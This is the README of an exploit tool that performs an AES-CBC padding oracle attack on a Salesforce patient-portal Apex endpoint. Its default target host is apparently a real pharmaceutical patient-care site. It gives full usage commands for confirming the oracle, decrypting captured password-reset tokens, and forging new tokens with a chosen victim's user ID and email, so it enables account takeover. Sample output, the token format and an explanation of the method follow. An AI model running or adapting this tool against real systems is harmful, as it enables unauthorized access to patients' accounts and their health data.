# AES-CBC Padding Oracle Attack

Exploit tool for AES-CBC padding oracle vulnerabilities in Salesforce Lightning Web Runtime (LWR) patient portals. Targets the `MyacConfirmationPageController.checkIfLinkNotExpired` Apex method exposed via `/s/webruntime/api/apex/execute`.

Supports three operations:
- **Test** — Verify the three oracle states (length error, bad padding, valid decryption)
- **Decrypt** — Recover plaintext from an AES-CBC encrypted token using parallel block decryption
- **Forge** — Create a valid encrypted token with arbitrary content without knowing the key

## Requirements

- Python 3.8+
- No external dependencies (stdlib only)

## Install

```bash
git clone https://github.com/DFC302/AES-CBC-POA.git
cd AES-CBC-POA
```

## Usage

### Test Oracle

Verify the endpoint is vulnerable by confirming three distinct error states:

```bash
python3 aes_cbc_poa.py --test
```

```
State 1 (wrong length,  30B): -1  expect -1  [PASS]
State 2 (bad padding,   32B):  0  expect  0  [PASS]
State 3 (16B edge case):       1

[+] Oracle CONFIRMED exploitable.
```

### Decrypt Token

Decrypt a base64-encoded AES-CBC token captured from a password reset URL:

```bash
python3 aes_cbc_poa.py --decrypt '<base64_token>' --threads 7
```

Add `--verbose` for per-byte progress output:

```bash
python3 aes_cbc_poa.py --decrypt '<base64_token>' --threads 7 --verbose
```

Decrypts all blocks in parallel. Typical token (128 bytes, 7 blocks) takes ~12 minutes with 7 threads and ~15,000 requests.

### Forge Token

Create a new encrypted token containing a target user's Salesforce ID and email:

```bash
python3 aes_cbc_poa.py --forge --userid 005XXXXXXXXXYYYYYY --email target@example.com
```

Optionally specify a custom timestamp (default: current time, 24h validity):

```bash
python3 aes_cbc_poa.py --forge --userid 005XXXXXXXXXYYYYYY --email target@example.com --timestamp 1772244877815
```

Forgery is sequential (blocks built last-to-first) and takes ~10 minutes for a typical token. The forged token is verified against the oracle before output.

### Options

| Flag | Description |
|------|-------------|
| `--test` | Test the three oracle states |
| `--decrypt TOKEN` | Decrypt a base64 token |
| `--forge` | Forge a new token |
| `--userid ID` | Target Salesforce User ID (required for forge) |
| `--email EMAIL` | Target email address (required for forge) |
| `--timestamp TS` | Epoch milliseconds (default: now) |
| `--host HOST` | Target hostname (default: `immunology.my.abbviecare.com`) |
| `--threads N` | Parallel threads for decrypt (default: 7) |
| `--verbose` | Show per-byte decryption/forgery progress |

## How It Works

The Salesforce LWR Apex endpoint returns three distinct error types when processing encrypted input:

1. `SecurityException: "Input length must be multiple of 16"` — ciphertext is wrong length
2. `SecurityException: "Given final block not properly padded"` — AES decryption succeeded but PKCS#7 padding is invalid
3. `JSONException: "No content to map to Object"` — decryption AND unpadding succeeded, plaintext parsed as JSON

The transition from error #2 to error #3 is the padding oracle: it tells the attacker whether a given ciphertext produced valid PKCS#7 padding after decryption.

**Decrypt** exploits this by manipulating the preceding ciphertext block byte-by-byte. For each byte position, 256 guesses are tested. When the oracle returns "valid padding" instead of "bad padding," the intermediate decryption value is derived mathematically, and XOR with the original preceding block recovers the plaintext byte.

**Forge** reverses the process: starting from the last block and working backward, the tool discovers intermediate values for each randomly-chosen ciphertext block, then XORs with the desired plaintext to compute the preceding block. The result is a completely new ciphertext that decrypts to attacker-controlled plaintext.

## Token Format

Decrypted tokens contain JSON with the following structure:

```json
{
  "userid": "005J9000000bB8FIAU",
  "un": "user@example.com",
  "timestamp": "1772238536204"
}
```

- `userid` — 18-character Salesforce User ID (prefix `005`)
- `un` — User's email address
- `timestamp` — Epoch milliseconds (24-hour validity window)

## References

- Vaudenay, S. (2002). "Security Flaws Induced by CBC Padding"
- Rizzo, J. & Duong, T. (2010). "Practical Padding Oracle Attacks"
